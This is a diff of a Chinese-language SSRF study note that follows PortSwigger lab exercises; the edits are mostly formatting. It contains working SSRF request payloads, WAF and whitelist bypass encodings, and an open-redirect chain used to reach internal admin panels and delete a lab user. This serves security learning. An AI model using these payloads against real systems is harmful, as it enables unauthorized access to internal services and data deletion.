@@ -14,16 +14,13 @@ Ref: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-sec
 
 在典型的 SSRF 攻擊中，攻擊者可能會導致伺服器連線至組織架構中僅允許內部連線的服務。在其他情況，可能強制伺服器連接到外部的任意外部系統。這可能會洩漏敏感資訊，例如授權憑證。
 
-![](https://portswigger.net/web-security/images/server-side%20request%20forgery.svg)
-
-圖片來源：[https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)
+![alt text](src/image8.png)
 
 ## SSRF 攻擊造成的影響
 
 成功的 SSRF 攻擊通常會導致未經授權的操作或存取組織內部的資料。這可能發生在易受攻擊的應用中，或其他能夠與它連線之後端系統。在某些情況下，SSRF 可能允許攻擊者執行任意指令。
 
 SSRF 攻擊可能使其連線至外部的第三方系統並導致惡意的連續攻擊。這些似乎來自自託管易受攻擊的應用的組織。
-
 
 ## 常見的 SSRF 攻擊
 
@@ -35,7 +32,7 @@ SSRF 攻擊通常利用信任關係來從易受攻擊的應用程式升級攻擊
 
 例如，想像一個購物應用程式，讓使用者查看某個物品在特定商店的庫存情況。為了提供庫存資訊，該應用程式必須查詢各種後端 REST API。它通過將 URL 傳遞到相關的後端 API 端點，透過前端 HTTP 請求來實現這一點。當使用者查看某物品的庫存狀態時，他們的瀏覽器會發出以下請求：
 
-```
+```http
 POST /product/stock HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 118
@@ -47,7 +44,7 @@ stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%
 
 在這個例子中，攻擊者可以修改請求，指定一個伺服器本地的 URL：
 
-```
+```http
 POST /product/stock HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 118
@@ -59,24 +56,26 @@ stockApi=http://localhost/admin
 
 攻擊者可以訪問 `/admin` URL，但管理功能通常只有經過驗證的使用者才能存取。這意味著攻擊者不會看到任何有趣的內容。然而，如果對 `/admin` URL 的請求來自本地機器，則會繞過正常的存取控制。應用程式會授予完整的管理功能存取權限，因為這個請求看起來是來自一個受信任的位置。
 
-* **Lab: [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)**
-    1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
-        ```
-        stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
-        ```
-    2. 將 body 更改成 admin 的路徑 `http://localhost/admin` 查看回應
-        ```
-        stockApi=http%3A%2F%2Flocalhost%2Fadmin
-        ```
-    3. 回應為一個 html 資料，並在其中找到刪除使用者 `carlos` 的 API：`/admin/delete?username=carlos`，透過修改上述提到的 `stockApi`，使其向 `http://localhost/admin/delete?username=carlos` 發送請求即可刪除使用者並完成 Lab
-        ```
-        stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
-        ```
+::: tip **Lab: [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)**
+1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
+    ```raw
+    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+    ```
+2. 將 body 更改成 admin 的路徑 `http://localhost/admin` 查看回應
+    ```raw
+    stockApi=http%3A%2F%2Flocalhost%2Fadmin
+    ```
+3. 回應為一個 html 資料，並在其中找到刪除使用者 `carlos` 的 API：`/admin/delete?username=carlos`，透過修改上述提到的 `stockApi`，使其向 `http://localhost/admin/delete?username=carlos` 發送請求即可刪除使用者並完成 Lab
+    ```raw
+    stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
+    ```
+:::
 
 為什麼應用程式會這樣運作，並隱含地信任來自本地機器的請求？這可能出於各種原因：
-  * 存取控制檢查可能在應用程式伺服器前面的另一個元件中實施。當連接回到伺服器時，這個檢查就被繞過了。
-  * 出於災難復原的考量，應用程式可能允許來自本地機器的任何使用者無需登入即可進行管理存取。這為管理員提供了一種在遺失憑證時恢復系統的方法。這種設計假設只有完全受信任的使用者才會直接從伺服器發出請求。
-  * 管理介面可能監聽與主應用程式不同的埠號，且可能無法被使用者直接存取。
+
+* 存取控制檢查可能在應用程式伺服器前面的另一個元件中實施。當連接回到伺服器時，這個檢查就被繞過了。
+* 出於災難復原的考量，應用程式可能允許來自本地機器的任何使用者無需登入即可進行管理存取。這為管理員提供了一種在遺失憑證時恢復系統的方法。這種設計假設只有完全受信任的使用者才會直接從伺服器發出請求。
+* 管理介面可能監聽與主應用程式不同的埠號，且可能無法被使用者直接存取。
 
 這類信任關係，即來自本地機器的請求會得到不同於普通請求的處理，通常使 SSRF 成為一個嚴重的漏洞。
 
@@ -86,7 +85,7 @@ stockApi=http://localhost/admin
 
 在前面的例子中，假設後端 URL `https://192.168.0.68/admin` 上有一個管理介面。攻擊者可以提交以下請求來利用 SSRF 漏洞，並存取管理介面：
 
-```
+```http
 POST /product/stock HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 118
@@ -94,19 +93,20 @@ Content-Length: 118
 stockApi=http://192.168.0.68/admin
 ```
 
-* **Lab: [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)**
-    1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
-        ```
-        stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
-        ```
-    2. 將 body 更改成 admin 的路徑 `http://192.168.0.1/admin` 爆破取得正常回應的 IP，並查看回應。經爆破得正常回應之 IP 為 `192.168.0.16`。
-        ```
-        stockApi=http%3A%2F%2F192.168.0.16%3A8080%2Fadmin
-        ```
-    3. 回應為一個 html 資料，並在其中找到刪除使用者 `carlos` 的 API：`/admin/delete?username=carlos`，透過修改上述提到的 `stockApi`，使其向 `http://192.168.0.16:8080/admin/delete?username=carlos` 發送請求即可刪除使用者並完成 Lab
-        ```
-        stockApi=http%3A%2F%192.168.0.16%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
-        ```
+::: tip **Lab: [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)**
+1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
+    ```raw
+    stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+    ```
+2. 將 body 更改成 admin 的路徑 `http://192.168.0.1/admin` 爆破取得正常回應的 IP，並查看回應。經爆破得正常回應之 IP 為 `192.168.0.16`。
+    ```raw
+    stockApi=http%3A%2F%2F192.168.0.16%3A8080%2Fadmin
+    ```
+3. 回應為一個 html 資料，並在其中找到刪除使用者 `carlos` 的 API：`/admin/delete?username=carlos`，透過修改上述提到的 `stockApi`，使其向 `http://192.168.0.16:8080/admin/delete?username=carlos` 發送請求即可刪除使用者並完成 Lab
+    ```raw
+    stockApi=http%3A%2F%192.168.0.16%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
+    ```
+:::
 
 ## 繞過常見的 SSRF 防禦
 
@@ -124,21 +124,22 @@ stockApi=http://192.168.0.68/admin
 
 * 提供一個您控制的 URL，將其重定向到目標 URL。嘗試使用不同的重定向代碼，以及目標 URL 的不同協定。例如，在重定向期間從 `http:` URL 切換到 `https:` URL 已被證明可以繞過某些反 SSRF 過濾器。
 
-* **Lab: [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)**
-    1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
-        ```
-        stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
-        ```
-    2. 嘗試存取 `http://127.0.0.1/admin` 會被 WAF 擋住
-    3. 嘗試存取 `http://127.1/admin` 繞過後仍被 WAF 擋住
-    4. 將 `admin` 的 `a` 字元使用雙重 URL 編碼改成 `%2561dmin` 即可繞過 WAF
-        ```
-        stockApi=http%3A%2F%2F127.1%2F%2561dmin
-        ```
-    5. 回應為一個 html 資料，並在其中找到刪除使用者 `carlos` 的 API：`/admin/delete?username=carlos`，透過修改上述提到的 `stockApi`，使其向 `http://127.1/%2561dmin/delete?username=carlos` 發送請求即可刪除使用者並完成 Lab
-        ```
-        stockApi=http%3A%2F%2F127.1%2F%2561dmin%2Fdelete%3Fusername%3Dcarlos
-        ```
+::: tip **Lab: [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)**
+1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
+    ```raw
+    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+    ```
+2. 嘗試存取 `http://127.0.0.1/admin` 會被 WAF 擋住
+3. 嘗試存取 `http://127.1/admin` 繞過後仍被 WAF 擋住
+4. 將 `admin` 的 `a` 字元使用雙重 URL 編碼改成 `%2561dmin` 即可繞過 WAF
+    ```raw
+    stockApi=http%3A%2F%2F127.1%2F%2561dmin
+    ```
+5. 回應為一個 html 資料，並在其中找到刪除使用者 `carlos` 的 API：`/admin/delete?username=carlos`，透過修改上述提到的 `stockApi`，使其向 `http://127.1/%2561dmin/delete?username=carlos` 發送請求即可刪除使用者並完成 Lab
+    ```raw
+    stockApi=http%3A%2F%2F127.1%2F%2561dmin%2Fdelete%3Fusername%3Dcarlos
+    ```
+:::
 
 ### SSRF 使用白名單輸入過濾器
 
@@ -159,17 +160,18 @@ URL 規範包含許多在使用這種方法實現臨時解析和驗證 URL 時�
 
 * 可以結合使用這些技術。
 
-* **Lab: [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)**
-    1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
-        ```
-        stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
-        ```
-    2. 嘗試存取 `http://127.0.0.1/admin` 被白名單擋住，只允許 `stock.weliketoshop.net` 的主機
-    3. 嘗試存取 `http://localhost@stock.weliketoshop.net%2Fadmin` 回應狀態碼 `500`
-    4. 嘗試存取 `http://localhost%2523stock.weliketoshop.net%2Fadmin` 仍被白名單擋住
-    5. 嘗試存取 `http://localhost%2523@stock.weliketoshop.net%2Fadmin` 成功回應 html 資料
-    6. 找到刪除使用者的 API `/admin/delete?username=carlos`
-    7. 發送刪除使用者的請求 `http://localhost%2523@stock.weliketoshop.net%2Fadmin%2Fdelete%3Fusername%3Dcarlos` 完成 Lab
+::: tip **Lab: [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)**
+1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
+    ```raw
+    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+    ```
+2. 嘗試存取 `http://127.0.0.1/admin` 被白名單擋住，只允許 `stock.weliketoshop.net` 的主機
+3. 嘗試存取 `http://localhost@stock.weliketoshop.net%2Fadmin` 回應狀態碼 `500`
+4. 嘗試存取 `http://localhost%2523stock.weliketoshop.net%2Fadmin` 仍被白名單擋住
+5. 嘗試存取 `http://localhost%2523@stock.weliketoshop.net%2Fadmin` 成功回應 html 資料
+6. 找到刪除使用者的 API `/admin/delete?username=carlos`
+7. 發送刪除使用者的請求 `http://localhost%2523@stock.weliketoshop.net%2Fadmin%2Fdelete%3Fusername%3Dcarlos` 完成 Lab
+:::
 
 ### 透過開放重定向繞過 SSRF 過濾器
 
@@ -179,19 +181,19 @@ URL 規範包含許多在使用這種方法實現臨時解析和驗證 URL 時�
 
 例如，應用程式包含一個開放重定向漏洞，其中以下 URL：
 
-```
+```raw
 /product/nextProduct?currentProductId=6&path=http://evil-user.net
 ```
 
 會返回重定向到：
 
-```
+```raw
 http://evil-user.net
 ```
 
 你可以利用開放重定向漏洞來繞過 URL 過濾器，並如下利用 SSRF 漏洞：
 
-```
+```http
 POST /product/stock HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 118
@@ -201,30 +203,31 @@ stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=htt
 
 這個 SSRF 攻擊有效的原因是，應用程式首先驗證提供的 `stockAPI` URL 是否在允許的域名上，確實如此。然後應用程式請求提供的 URL，這觸發了開放重定向。它跟隨重定向，並向攻擊者選擇的內部 URL 發出請求。
 
-* **Lab: [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)**
-    1. 進入任意商品頁面，點擊 Check stock 按鈕查看庫存，發現 data 部分會呼叫 API：
-        ```
-        stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
-        ```
+::: tip **Lab: [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)**
+1. 進入任意商品頁面，點擊 Check stock 按鈕查看庫存，發現 data 部分會呼叫 API：
+    ```raw
+    stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+    ```
 
-        使用 URL decode 後是：
-        ```
-        stockApi=/product/stock/check?productId=1&storeId=1
-        ```
-    2. 由於這邊呼叫 API 沒有帶 Host，所以要找找看是否有能夠轉址的 API
-    3. 在點擊 Next product 按鈕後，發現有一個 API 會進行轉址：
-        ```
-        /product/nextProduct?currentProductId=1&path=/product?productId=2
-        ```
-    4. 將以上資訊組合後，即可向題目要求的 URL 發送請求並刪除指定使用者完成此 Lab：
-        ```
-        stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
-        ```
+    使用 URL decode 後是：
+    ```raw
+    stockApi=/product/stock/check?productId=1&storeId=1
+    ```
+2. 由於這邊呼叫 API 沒有帶 Host，所以要找找看是否有能夠轉址的 API
+3. 在點擊 Next product 按鈕後，發現有一個 API 會進行轉址：
+    ```raw
+    /product/nextProduct?currentProductId=1&path=/product?productId=2
+    ```
+4. 將以上資訊組合後，即可向題目要求的 URL 發送請求並刪除指定使用者完成此 Lab：
+    ```raw
+    stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
+    ```
 
-        在回應中找到刪除使用者的 API，接著進行刪除
-        ```
-        stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
-        ```
+    在回應中找到刪除使用者的 API，接著進行刪除
+    ```raw
+    stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+    ```
+:::
 
 ## 盲目 SSRF 漏洞
 
@@ -232,9 +235,10 @@ stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=htt
 
 盲目 SSRF 比較難以利用，但有時會導致伺服器或其他後端組件的完全遠端代碼執行。
 
-### 了解更多
+::: info Read more
 
 * [Finding and exploiting blind SSRF vulnerabilities](https://portswigger.net/web-security/ssrf/blind)
+:::
 
 ## 發現 SSRF 漏洞的隱藏攻擊面
 
@@ -254,7 +258,8 @@ stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=htt
 
 請參閱盲目 SSRF 漏洞，了解涉及 Referer 標頭的漏洞範例。
 
-#### 了解更多
+::: info 了解更多
 
 * [Cracking the lens: Targeting auxiliary systems](https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#aux)
 * [URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
+:::
